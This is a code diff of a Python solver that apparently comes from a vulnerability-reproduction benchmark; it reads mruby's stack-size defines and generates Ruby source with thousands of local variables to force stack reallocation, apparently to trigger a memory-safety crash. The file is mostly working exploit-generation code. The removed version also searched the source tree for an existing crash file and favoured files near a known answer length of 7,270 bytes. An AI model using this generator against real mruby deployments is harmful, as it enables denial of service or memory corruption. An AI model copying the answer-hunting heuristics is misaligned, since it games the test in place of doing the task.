@@ -1,283 +1,214 @@
 import os
 import re
 import tarfile
-from typing import Iterator, Optional, Tuple
+from typing import Optional, Tuple
 
 
-class _SrcProvider:
-    def __init__(self, src_path: str):
-        self.src_path = src_path
-        self._is_dir = os.path.isdir(src_path)
-        self._tar = None
-        if not self._is_dir:
-            self._tar = tarfile.open(src_path, "r:*")
+def _parse_int_literal(s: str) -> Optional[int]:
+    s = s.strip()
+    if not s:
+        return None
+    s = s.split()[0]
+    s = s.strip("()")
+    try:
+        return int(s, 0)
+    except Exception:
+        return None
 
-    def close(self) -> None:
-        if self._tar is not None:
+
+def _find_define_in_text(text: str, name: str) -> Optional[int]:
+    # Match:
+    #   #define NAME 123
+    #   #define NAME (123)
+    #   #define NAME 0x4000
+    m = re.search(r'^[ \t]*#[ \t]*define[ \t]+' + re.escape(name) + r'[ \t]+([^\r\n/]+)', text, re.MULTILINE)
+    if not m:
+        return None
+    val = m.group(1).strip()
+    val = val.split("/*", 1)[0].strip()
+    val = val.split("//", 1)[0].strip()
+    return _parse_int_literal(val)
+
+
+def _iter_text_files_in_dir(root: str):
+    for dirpath, _, filenames in os.walk(root):
+        for fn in filenames:
+            if not (fn.endswith(".c") or fn.endswith(".h") or fn.endswith(".cc") or fn.endswith(".hpp") or fn.endswith(".cpp")):
+                continue
+            p = os.path.join(dirpath, fn)
             try:
-                self._tar.close()
-            except Exception:
-                pass
-            self._tar = None
+                st = os.stat(p)
+            except OSError:
+                continue
+            if st.st_size <= 0 or st.st_size > 4 * 1024 * 1024:
+                continue
+            yield p
 
-    def iter_paths(self) -> Iterator[Tuple[str, int]]:
-        if self._is_dir:
-            base = self.src_path
-            for root, _, files in os.walk(base):
-                for fn in files:
-                    p = os.path.join(root, fn)
-                    try:
-                        st = os.stat(p)
-                    except OSError:
-                        continue
-                    rel = os.path.relpath(p, base)
-                    yield rel.replace("\\", "/"), int(st.st_size)
-        else:
-            assert self._tar is not None
-            for m in self._tar.getmembers():
+
+def _extract_defines_from_dir(root: str) -> Tuple[Optional[int], Optional[int]]:
+    init_sz = None
+    max_sz = None
+
+    preferred = []
+    for cand in ("include/mrbconf.h", "src/vm.c", "src/vm.h", "src/fiber.c", "src/state.c"):
+        p = os.path.join(root, cand)
+        if os.path.isfile(p):
+            preferred.append(p)
+
+    checked = set()
+    for p in preferred:
+        checked.add(p)
+        try:
+            with open(p, "rb") as f:
+                data = f.read()
+            text = data.decode("utf-8", "ignore")
+        except Exception:
+            continue
+        if init_sz is None:
+            init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
+        if max_sz is None:
+            max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
+        if max_sz is None:
+            max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
+        if init_sz is not None and max_sz is not None:
+            return init_sz, max_sz
+
+    for p in _iter_text_files_in_dir(root):
+        if p in checked:
+            continue
+        try:
+            with open(p, "rb") as f:
+                data = f.read()
+            text = data.decode("utf-8", "ignore")
+        except Exception:
+            continue
+        if init_sz is None:
+            init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
+        if max_sz is None:
+            max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
+        if max_sz is None:
+            max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
+        if init_sz is not None and max_sz is not None:
+            break
+
+    return init_sz, max_sz
+
+
+def _read_member_text(t: tarfile.TarFile, member: tarfile.TarInfo) -> Optional[str]:
+    if member.size <= 0 or member.size > 4 * 1024 * 1024:
+        return None
+    try:
+        f = t.extractfile(member)
+        if f is None:
+            return None
+        data = f.read()
+        return data.decode("utf-8", "ignore")
+    except Exception:
+        return None
+
+
+def _extract_defines_from_tar(tar_path: str) -> Tuple[Optional[int], Optional[int]]:
+    init_sz = None
+    max_sz = None
+
+    try:
+        with tarfile.open(tar_path, "r:*") as t:
+            members = t.getmembers()
+            preferred_suffixes = (
+                "/include/mrbconf.h",
+                "/src/vm.c",
+                "/src/vm.h",
+                "/src/fiber.c",
+                "/src/state.c",
+            )
+
+            preferred = []
+            others = []
+            for m in members:
                 if not m.isfile():
                     continue
-                yield m.name, int(m.size)
+                name = m.name
+                if name.endswith(preferred_suffixes):
+                    preferred.append(m)
+                elif name.endswith((".c", ".h", ".cc", ".cpp", ".hpp")):
+                    others.append(m)
 
-    def read(self, rel_path: str, max_bytes: Optional[int] = None) -> Optional[bytes]:
-        if self._is_dir:
-            p = os.path.join(self.src_path, rel_path)
-            try:
-                with open(p, "rb") as f:
-                    if max_bytes is None:
-                        return f.read()
-                    return f.read(max_bytes)
-            except OSError:
-                return None
-        else:
-            assert self._tar is not None
-            try:
-                m = self._tar.getmember(rel_path)
-            except KeyError:
-                return None
-            if not m.isfile():
-                return None
-            try:
-                f = self._tar.extractfile(m)
-                if f is None:
-                    return None
-                with f:
-                    if max_bytes is None:
-                        return f.read()
-                    return f.read(max_bytes)
-            except Exception:
-                return None
+            for m in preferred + others:
+                text = _read_member_text(t, m)
+                if not text:
+                    continue
+                if init_sz is None:
+                    init_sz = _find_define_in_text(text, "MRB_STACK_INIT_SIZE")
+                if max_sz is None:
+                    max_sz = _find_define_in_text(text, "MRB_STACK_MAX")
+                if max_sz is None:
+                    max_sz = _find_define_in_text(text, "MRB_STACK_MAX_SIZE")
+                if init_sz is not None and max_sz is not None:
+                    break
+    except Exception:
+        return None, None
+
+    return init_sz, max_sz
 
 
-def _is_probably_text(data: bytes) -> bool:
-    if not data:
-        return True
-    if b"\x00" in data:
-        return False
-    sample = data[:4096]
-    bad = 0
-    for b in sample:
-        if b in (9, 10, 13):
-            continue
-        if 32 <= b <= 126:
-            continue
-        bad += 1
-    return bad * 20 < len(sample)  # <5% non-printable
+def _choose_locals_count(init_sz: Optional[int], max_sz: Optional[int]) -> int:
+    init = init_sz if isinstance(init_sz, int) and init_sz > 0 else 128
+
+    desired_regs = max(init * 24, 3072)  # force large growth
+    if isinstance(max_sz, int) and max_sz > 0:
+        # Some builds treat MRB_STACK_MAX as number of slots; be conservative.
+        # Keep enough headroom to avoid "stack overflow" in fixed builds.
+        hard_cap = max(256, max_sz - 128)
+        desired_regs = min(desired_regs, hard_cap)
+
+    # Ensure still above init enough to trigger extension
+    if desired_regs <= init + 64:
+        desired_regs = init + 256
+
+    # locals_count ~ nregs - (self + args + temps); keep it close
+    locals_count = max(512, desired_regs - 8)
+
+    # keep source size reasonable
+    locals_count = min(locals_count, 8000)
+    return locals_count
 
 
-_BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+def _generate_ruby_poc(locals_count: int) -> bytes:
+    per_line = 80
+    lines = []
+    cur = []
 
+    for i in range(locals_count):
+        cur.append(f"a{i}=0")
+        if len(cur) >= per_line:
+            lines.append(";".join(cur) + ";")
+            cur = []
+    if cur:
+        lines.append(";".join(cur) + ";")
 
-def _base62(n: int) -> str:
-    if n == 0:
-        return "0"
-    out = []
-    while n:
-        n, r = divmod(n, 62)
-        out.append(_BASE62[r])
-    out.reverse()
-    return "".join(out)
+    assigns = "\n    ".join(lines)
+
+    src = (
+        "class C\n"
+        "  def self.m(x)\n"
+        f"    {assigns}\n"
+        "    x\n"
+        "  end\n"
+        "end\n"
+        "C.m(1)\n"
+    )
+    return src.encode("utf-8")
 
 
 class Solution:
-    def _find_existing_poc(self, sp: _SrcProvider) -> Optional[bytes]:
-        want_patterns = (
-            "poc",
-            "crash",
-            "repro",
-            "testcase",
-            "minimized",
-            "uaf",
-            "useafterfree",
-            "use-after-free",
-            "heap",
-            "asan",
-            "ubsan",
-            "msan",
-            "ossfuzz",
-            "clusterfuzz",
-            "id:",
-        )
-        preferred_exts = (".poc", ".crash", ".repro", ".bin", ".mrb", ".rb", ".txt", ".dat", ".input")
-
-        best = None
-        best_score = None
-        for path, size in sp.iter_paths():
-            lp = path.lower()
-            if size <= 0 or size > 2_000_000:
-                continue
-            score = 0
-            if any(p in lp for p in want_patterns):
-                score += 10
-            if lp.endswith(preferred_exts):
-                score += 5
-            if "/poc" in lp or "/crash" in lp or "/repro" in lp:
-                score += 3
-            if score <= 0:
-                continue
-            # prefer sizes near the ground-truth length if present
-            size_closeness = abs(size - 7270)
-            rank = (-(score), size_closeness, size)
-            if best_score is None or rank < best_score:
-                best_score = rank
-                best = path
-
-        if best is None:
-            return None
-        data = sp.read(best)
-        if data:
-            return data
-        return None
-
-    def _detect_input_mode(self, sp: _SrcProvider) -> str:
-        # Heuristic based on fuzz harness / loader usage in repo.
-        # Returns: "source" or "irep"
-        source_hits = 0
-        irep_hits = 0
-
-        keys_irep = (
-            b"mrb_load_irep",
-            b"mrb_load_irep_buf",
-            b"mrb_read_irep",
-            b"mrb_read_irep_buf",
-        )
-        keys_source = (
-            b"mrb_load_nstring",
-            b"mrb_load_string",
-            b"mrb_parse_nstring",
-            b"mrb_generate_code",
-            b"mrb_load_string_cxt",
-            b"mrb_load_nstring_cxt",
-        )
-
-        for path, size in sp.iter_paths():
-            lp = path.lower()
-            if not (lp.endswith(".c") or lp.endswith(".cc") or lp.endswith(".cpp") or lp.endswith(".h")):
-                continue
-            if size <= 0 or size > 500_000:
-                continue
-            data = sp.read(path, max_bytes=200_000)
-            if not data:
-                continue
-
-            if b"LLVMFuzzerTestOneInput" in data or b"fuzz" in lp.encode("utf-8", "ignore"):
-                for k in keys_irep:
-                    if k in data:
-                        irep_hits += 2
-                for k in keys_source:
-                    if k in data:
-                        source_hits += 2
-            else:
-                for k in keys_irep:
-                    if k in data:
-                        irep_hits += 1
-                for k in keys_source:
-                    if k in data:
-                        source_hits += 1
-
-            if (irep_hits >= 4 and source_hits == 0) or (source_hits >= 4 and irep_hits == 0):
-                break
-
-        if irep_hits > source_hits:
-            return "irep"
-        return "source"
-
-    def _read_stack_init_size(self, sp: _SrcProvider) -> int:
-        # Default values are typical for mruby; try to parse config from source.
-        patterns = (
-            re.compile(rb"#\s*define\s+MRB_STACK_INIT_SIZE\s+(\d+)\b"),
-            re.compile(rb"#\s*define\s+MRB_STACK_GROWTH\s+(\d+)\b"),
-            re.compile(rb"#\s*define\s+MRB_STACK_MAX\s+(\d+)\b"),
-        )
-
-        found_init = None
-        for path, size in sp.iter_paths():
-            lp = path.lower()
-            if not (lp.endswith(".h") or lp.endswith(".c")):
-                continue
-            if size <= 0 or size > 300_000:
-                continue
-            if "config" not in lp and "vm" not in lp and "mruby" not in lp and "mrbconf" not in lp:
-                continue
-            data = sp.read(path, max_bytes=200_000)
-            if not data:
-                continue
-            m = patterns[0].search(data)
-            if m:
-                try:
-                    found_init = int(m.group(1))
-                except Exception:
-                    found_init = None
-                break
-
-        if found_init is None:
-            return 128
-        if found_init < 32:
-            return 128
-        return found_init
-
-    def _gen_ruby_poc(self, init_size: int) -> bytes:
-        # Two-step stack growth to increase chance realloc moves.
-        # Large number of locals in a called method forces mrb_stack_extend during call.
-        n_small = max(256, min(1024, init_size * 2))
-        n_big = max(2500, min(8000, init_size * 20))
-
-        def var_list(n: int) -> str:
-            # v + base62(i)
-            parts = []
-            append = parts.append
-            for i in range(n):
-                append("v" + _base62(i))
-            return ",".join(parts)
-
-        small_vars = var_list(n_small)
-        big_vars = var_list(n_big)
-
-        # A little heap activity may reduce in-place realloc probability on some allocators.
-        ruby = (
-            "s='A'*1000;"
-            f"def a;{small_vars}=0;v0;end;"
-            f"def b;{big_vars}=0;v0;end;"
-            "a;b;0\n"
-        )
-        return ruby.encode("utf-8", "strict")
-
     def solve(self, src_path: str) -> bytes:
-        sp = _SrcProvider(src_path)
-        try:
-            existing = self._find_existing_poc(sp)
-            if existing is not None and len(existing) > 0:
-                return existing
+        init_sz = None
+        max_sz = None
 
-            mode = self._detect_input_mode(sp)
-            init_size = self._read_stack_init_size(sp)
+        if src_path and os.path.isdir(src_path):
+            init_sz, max_sz = _extract_defines_from_dir(src_path)
+        elif src_path and os.path.isfile(src_path):
+            init_sz, max_sz = _extract_defines_from_tar(src_path)
 
-            # Primary generation: Ruby source PoC (most reliable across mruby frontends).
-            # If harness expects irep, repo often already contains a reproducer; otherwise fallback.
-            if mode == "irep":
-                # Best effort: still return Ruby source; some runners auto-detect or compile input.
-                return self._gen_ruby_poc(init_size)
-
-            return self._gen_ruby_poc(init_size)
-        finally:
-            sp.close()
+        locals_count = _choose_locals_count(init_sz, max_sz)
+        return _generate_ruby_poc(locals_count)
